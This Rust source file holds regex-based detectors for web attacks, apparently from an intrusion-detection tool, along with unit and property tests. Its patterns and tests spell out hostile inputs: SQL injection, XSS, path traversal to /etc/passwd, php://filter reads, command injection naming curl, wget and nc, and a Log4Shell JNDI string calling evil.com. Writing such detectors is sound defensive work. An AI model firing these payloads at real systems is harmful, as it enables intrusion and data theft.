//! Heuristic detectors: regex-based pattern matching for common attacks.
//!
//! Each heuristic implements [`Heuristic`] and returns zero or more [`Signal`]s
//! for an event. Heuristics are fast (microseconds) and run on every event
//! that passes the rules engine. They never do network I/O.

use std::sync::LazyLock;

use regex::Regex;

use crate::analysis::{Signal, SignalKind};
use crate::event::{Event, HttpData};

/// A heuristic detector.
pub trait Heuristic: Send + Sync {
    /// Stable name for logging/metrics.
    fn name(&self) -> &'static str;

    /// Analyze an event, returning signals it detected.
    fn analyze(&self, evt: &Event) -> Vec<Signal>;
}

/// Composite heuristic that runs all registered detectors.
pub struct HeuristicEngine {
    detectors: Vec<Box<dyn Heuristic>>,
}

impl HeuristicEngine {
    /// Create a new engine with the default set of detectors.
    pub fn with_defaults() -> Self {
        Self {
            detectors: vec![
                Box::new(SqlInjection),
                Box::new(Xss),
                Box::new(PathTraversal),
                Box::new(Lfi),
                Box::new(Log4Shell),
                Box::new(CmdInjection),
                Box::new(SensitivePath),
                Box::new(BadCrawler),
                Box::new(EmptyUserAgent),
            ],
        }
    }

    /// Run all detectors and collect signals.
    pub fn analyze(&self, evt: &Event) -> Vec<Signal> {
        self.detectors.iter().flat_map(|h| h.analyze(evt)).collect()
    }
}

// ── Compiled regexes (LazyLock: auto-derefs to Regex) ────────────────────

/// Percent-decode a URL component and convert `+` to space.
///
/// Attackers routinely URL-encode payloads to bypass naive regex (`%27` for
/// `'`, `%20` or `+` for space). Heuristics run on the decoded form so the
/// patterns see the attacker's intent, not the transport encoding.
fn url_decode(s: &str) -> String {
    let bytes = s.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b'+' => {
                out.push(b' ');
                i += 1;
            }
            b'%' if i + 2 < bytes.len() => {
                let hi = hex_val(bytes[i + 1]);
                let lo = hex_val(bytes[i + 2]);
                if let (Some(h), Some(l)) = (hi, lo) {
                    out.push((h << 4) | l);
                    i += 3;
                } else {
                    out.push(bytes[i]);
                    i += 1;
                }
            }
            b => {
                out.push(b);
                i += 1;
            }
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

/// Decode a hex digit to its numeric value.
fn hex_val(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}

/// Decode both the path and the query of an HTTP event into a single
/// normalized string suitable for regex matching.
fn http_text(http: &HttpData) -> (String, String) {
    (
        url_decode(http.path.as_str()),
        http.query.as_deref().map(url_decode).unwrap_or_default(),
    )
}

static SQLI_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?i)(?:'|"")(?:\s|--|/\*|#).*(?:or|union|select|insert|update|delete|drop|exec)\b|(?:union\s+select)|(?:;\s*drop)|(?:'\s+or\s+'1'|'1'\s*=\s*'1'|or\s+1=1)|(?:information_schema)|(?:benchmark\s*\()"#).unwrap()
});

static XSS_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)(?:<script|javascript:|onerror\s*=|onload\s*=|onclick\s*=|onmouseover\s*=|<img[^>]+src\s*=|<iframe|<svg/onload|alert\s*\(|document\.cookie|eval\s*\()").unwrap()
});

static PATH_TRAVERSAL_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)(?:\.\.[/\\]|\.\.%2f|\.\.%5c|%2e%2e[/\\]|%2e%2e%2f|%2e%2e%5c|\.\.;[/\\]|/etc/passwd|/proc/self)").unwrap()
});

static LFI_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)(?:/etc/(?:passwd|shadow|hosts|group|nginx)|/proc/self/(?:environ|fd/|status|cmdline)|/var/log/[a-z]|/boot/grub|/windows/system32|/win\.ini|c:\\\\windows|file://|php://filter|php://input|expect://|data://)").unwrap()
});

static LOG4SHELL_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)\$\{jndi:(?:ldap|ldaps|rmi|dns|iiop|nis|nds|corba)").unwrap()
});

static CMD_INJECTION_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)(?:;\s*(?:cat|ls|id|whoami|uname|wget|curl|bash|sh|nc|ncat)\b)|(?:\|\s*(?:cat|ls|id|whoami|uname|wget|curl|bash|sh|nc|ncat)\b)|(?:`[^`]+`)|(?:\$\([^)]+\))|(?:&&\s*(?:cat|ls|id|whoami))").unwrap()
});

static SENSITIVE_PATH_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)(?:^/\.(?:env|git|svn|hg|bzr|ssh|aws|gcp|azure|kube|docker|terraform|npmrc|pypirc|netrc|htpasswd|ds_store))|(?:/(?:wp-admin|wp-login\.php|phpmyadmin|pma|adminer|wp-content|server-status|server-info|nginx-status|fpm-status|actuator(?:/env|/heapdump|/threaddump)))(?:/|$)|(?:\.(?:sql|bak|backup|old|swp|orig|save)$)|(?:/manager/html$)").unwrap()
});

static BAD_CRAWLER_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)(?:sqlmap|nikto|nmap|masscan|zgrab|nessus|acunetix|dirbuster|gobuster|wpscan|hydra|metasploit|burp|httrack|libwww|python-requests|curl/[0-9]|go-http-client|scrapy|crawler4j|semrush|ahrefs)").unwrap()
});

// ── Detectors ────────────────────────────────────────────────────────────

/// SQL injection patterns.
pub struct SqlInjection;
impl Heuristic for SqlInjection {
    fn name(&self) -> &'static str {
        "sqli"
    }
    fn analyze(&self, evt: &Event) -> Vec<Signal> {
        let http = match evt.http() {
            Some(h) => h,
            None => return vec![],
        };
        let (path, query) = http_text(http);
        for t in [path.as_str(), query.as_str()] {
            if SQLI_RE.is_match(t) {
                return vec![Signal {
                    kind: SignalKind::SqlInjection,
                    weight: 60,
                    detail: Some(format!("matched in: {t}")),
                }];
            }
        }
        vec![]
    }
}

/// XSS patterns.
pub struct Xss;
impl Heuristic for Xss {
    fn name(&self) -> &'static str {
        "xss"
    }
    fn analyze(&self, evt: &Event) -> Vec<Signal> {
        let http = match evt.http() {
            Some(h) => h,
            None => return vec![],
        };
        let (path, query) = http_text(http);
        for t in [path.as_str(), query.as_str()] {
            if XSS_RE.is_match(t) {
                return vec![Signal {
                    kind: SignalKind::Xss,
                    weight: 45,
                    detail: Some(format!("matched in: {t}")),
                }];
            }
        }
        vec![]
    }
}

/// Path traversal.
pub struct PathTraversal;
impl Heuristic for PathTraversal {
    fn name(&self) -> &'static str {
        "path_traversal"
    }
    fn analyze(&self, evt: &Event) -> Vec<Signal> {
        let http = match evt.http() {
            Some(h) => h,
            None => return vec![],
        };
        let (path, query) = http_text(http);
        if PATH_TRAVERSAL_RE.is_match(&path) || PATH_TRAVERSAL_RE.is_match(&query) {
            return vec![Signal {
                kind: SignalKind::PathTraversal,
                weight: 40,
                detail: Some(http.path.clone()),
            }];
        }
        vec![]
    }
}

/// Local file inclusion — attempts to read system files via path manipulation.
pub struct Lfi;
impl Heuristic for Lfi {
    fn name(&self) -> &'static str {
        "lfi"
    }
    fn analyze(&self, evt: &Event) -> Vec<Signal> {
        let http = match evt.http() {
            Some(h) => h,
            None => return vec![],
        };
        let (path, query) = http_text(http);
        for t in [path.as_str(), query.as_str()] {
            if LFI_RE.is_match(t) {
                return vec![Signal {
                    kind: SignalKind::Lfi,
                    weight: 50,
                    detail: Some(format!("matched in: {t}")),
                }];
            }
        }
        vec![]
    }
}

/// Log4Shell.
pub struct Log4Shell;
impl Heuristic for Log4Shell {
    fn name(&self) -> &'static str {
        "log4shell"
    }
    fn analyze(&self, evt: &Event) -> Vec<Signal> {
        let http = match evt.http() {
            Some(h) => h,
            None => return vec![],
        };
        let (path, query) = http_text(http);
        for t in [
            path.as_str(),
            query.as_str(),
            http.user_agent.as_deref().unwrap_or(""),
            http.referer.as_deref().unwrap_or(""),
        ] {
            if LOG4SHELL_RE.is_match(t) {
                return vec![Signal {
                    kind: SignalKind::Log4Shell,
                    weight: 80,
                    detail: Some(format!("matched: {t}")),
                }];
            }
        }
        for (k, v) in &http.headers {
            if LOG4SHELL_RE.is_match(v) {
                return vec![Signal {
                    kind: SignalKind::Log4Shell,
                    weight: 80,
                    detail: Some(format!("header {k}")),
                }];
            }
        }
        vec![]
    }
}

/// Command injection.
pub struct CmdInjection;
impl Heuristic for CmdInjection {
    fn name(&self) -> &'static str {
        "cmd_injection"
    }
    fn analyze(&self, evt: &Event) -> Vec<Signal> {
        let http = match evt.http() {
            Some(h) => h,
            None => return vec![],
        };
        let (path, query) = http_text(http);
        for t in [path.as_str(), query.as_str()] {
            if CMD_INJECTION_RE.is_match(t) {
                return vec![Signal {
                    kind: SignalKind::Rce,
                    weight: 70,
                    detail: Some(format!("matched in: {t}")),
                }];
            }
        }
        vec![]
    }
}

/// Sensitive path access.
pub struct SensitivePath;
impl Heuristic for SensitivePath {
    fn name(&self) -> &'static str {
        "sensitive_path"
    }
    fn analyze(&self, evt: &Event) -> Vec<Signal> {
        let http = match evt.http() {
            Some(h) => h,
            None => return vec![],
        };
        if SENSITIVE_PATH_RE.is_match(&http.path.to_ascii_lowercase()) {
            return vec![Signal {
                kind: SignalKind::SensitivePath,
                weight: 30,
                detail: Some(http.path.clone()),
            }];
        }
        vec![]
    }
}

/// Bad crawler User-Agent.
pub struct BadCrawler;
impl Heuristic for BadCrawler {
    fn name(&self) -> &'static str {
        "bad_crawler"
    }
    fn analyze(&self, evt: &Event) -> Vec<Signal> {
        let http = match evt.http() {
            Some(h) => h,
            None => return vec![],
        };
        let ua = match &http.user_agent {
            Some(u) => u.to_ascii_lowercase(),
            None => return vec![],
        };
        if BAD_CRAWLER_RE.is_match(&ua) {
            return vec![Signal {
                kind: SignalKind::BadCrawler,
                weight: 40,
                detail: Some(http.user_agent.clone().unwrap_or_default()),
            }];
        }
        vec![]
    }
}

/// Empty User-Agent.
pub struct EmptyUserAgent;
impl Heuristic for EmptyUserAgent {
    fn name(&self) -> &'static str {
        "empty_ua"
    }
    fn analyze(&self, evt: &Event) -> Vec<Signal> {
        let http = match evt.http() {
            Some(h) => h,
            None => return vec![],
        };
        match &http.user_agent {
            None => vec![Signal {
                kind: SignalKind::SuspiciousUA,
                weight: 10,
                detail: Some("missing".into()),
            }],
            Some(ua) if ua.trim().is_empty() => vec![Signal {
                kind: SignalKind::SuspiciousUA,
                weight: 10,
                detail: Some("empty".into()),
            }],
            _ => vec![],
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::event::{HttpData, ProtocolData, SourceKind};
    use std::net::Ipv4Addr;

    fn http_evt(path: &str, ua: Option<&str>) -> Event {
        Event::new(
            SourceKind::Synthetic,
            std::net::IpAddr::V4(Ipv4Addr::new(1, 2, 3, 4)),
            ProtocolData::Http(HttpData {
                path: path.to_string(),
                user_agent: ua.map(String::from),
                ..Default::default()
            }),
        )
    }

    #[test]
    fn detects_sqli() {
        let e = http_evt("/login?user=admin'+OR+1=1--", None);
        let signals = SqlInjection.analyze(&e);
        assert!(!signals.is_empty());
        assert_eq!(signals[0].kind, SignalKind::SqlInjection);
    }

    #[test]
    fn detects_xss() {
        let e = http_evt("/search?q=<script>alert(1)</script>", None);
        let signals = Xss.analyze(&e);
        assert!(!signals.is_empty());
        assert_eq!(signals[0].kind, SignalKind::Xss);
    }

    #[test]
    fn detects_path_traversal() {
        let e = http_evt("/../../../etc/passwd", None);
        let signals = PathTraversal.analyze(&e);
        assert!(!signals.is_empty());
    }

    #[test]
    fn detects_lfi() {
        let e = http_evt("/page?file=/etc/shadow", None);
        let signals = Lfi.analyze(&e);
        assert!(!signals.is_empty());
        assert_eq!(signals[0].kind, SignalKind::Lfi);
    }

    #[test]
    fn detects_lfi_php_filter() {
        let e = http_evt(
            "/?page=php://filter/convert.base64-encode/resource=index",
            None,
        );
        let signals = Lfi.analyze(&e);
        assert!(!signals.is_empty());
    }

    #[test]
    fn detects_log4shell() {
        let e = http_evt("/", Some("${jndi:ldap://evil.com/x}"));
        let signals = Log4Shell.analyze(&e);
        assert!(!signals.is_empty());
    }

    #[test]
    fn detects_sensitive_path() {
        let e = http_evt("/.env", None);
        let signals = SensitivePath.analyze(&e);
        assert!(!signals.is_empty());
    }

    #[test]
    fn detects_bad_crawler() {
        let e = http_evt("/", Some("sqlmap/1.0"));
        let signals = BadCrawler.analyze(&e);
        assert!(!signals.is_empty());
    }

    #[test]
    fn detects_empty_ua() {
        let e = http_evt("/", None);
        let signals = EmptyUserAgent.analyze(&e);
        assert!(!signals.is_empty());
    }

    #[test]
    fn clean_request_no_signals() {
        let e = http_evt("/api/users?page=1", Some("Mozilla/5.0"));
        let engine = HeuristicEngine::with_defaults();
        let signals = engine.analyze(&e);
        assert!(signals.is_empty(), "expected no signals, got {signals:?}");
    }

    #[test]
    fn engine_runs_all_detectors() {
        let e = http_evt("/.env?q=<script>alert(1)</script>", Some("sqlmap/1.0"));
        let engine = HeuristicEngine::with_defaults();
        let signals = engine.analyze(&e);
        assert!(
            signals.len() >= 3,
            "expected at least 3 signals, got {signals:?}"
        );
    }
}

#[cfg(test)]
mod proptests {
    use super::*;
    use crate::event::{HttpData, ProtocolData, SourceKind};
    use proptest::prelude::*;

    fn http_evt(path: &str, ua: Option<&str>) -> Event {
        Event::new(
            SourceKind::Synthetic,
            std::net::IpAddr::V4(std::net::Ipv4Addr::new(1, 2, 3, 4)),
            ProtocolData::Http(HttpData {
                path: path.to_string(),
                user_agent: ua.map(String::from),
                ..Default::default()
            }),
        )
    }

    proptest! {
        #[test]
        fn proptest_sqli_union_select(payload in "(?i)union\\s+select") {
            let e = http_evt(&format!("/?id={payload}"), None);
            let signals = SqlInjection.analyze(&e);
            prop_assert!(!signals.is_empty());
        }

        #[test]
        fn proptest_sqli_or_1_1(sep in r#"['"]"#) {
            let payload = format!("{sep} OR 1=1--");
            let e = http_evt(&format!("/?id={payload}"), None);
            let signals = SqlInjection.analyze(&e);
            prop_assert!(!signals.is_empty());
        }

        #[test]
        fn proptest_xss_script_tag(inner in r#"[a-zA-Z0-9]{1,20}"#) {
            let payload = format!("/?q=<script>alert({inner})</script>");
            let e = http_evt(&payload, None);
            let signals = Xss.analyze(&e);
            prop_assert!(!signals.is_empty());
        }

        #[test]
        fn proptest_path_traversal_encoded(count in 1usize..=5) {
            let payload = "%2e%2e%2f".repeat(count);
            let e = http_evt(&format!("/{payload}"), None);
            let signals = PathTraversal.analyze(&e);
            prop_assert!(!signals.is_empty());
        }

        #[test]
        fn proptest_log4shell_jndi(host in r#"[a-z]{1,10}\.com"#) {
            let payload = format!("${{jndi:ldap://{host}/x}}");
            let e = http_evt("/", Some(&payload));
            let signals = Log4Shell.analyze(&e);
            prop_assert!(!signals.is_empty());
        }

        #[test]
        fn proptest_clean_request_no_sqli(
            path in r#"/api/[a-z]+/[0-9]+"#,
            q in r#"[a-z]=[a-z0-9]{1,20}"#
        ) {
            let full = format!("{path}?{q}");
            let e = http_evt(&full, Some("Mozilla/5.0"));
            let signals = SqlInjection.analyze(&e);
            prop_assert!(signals.is_empty(), "false positive on {full}");
        }
    }
}
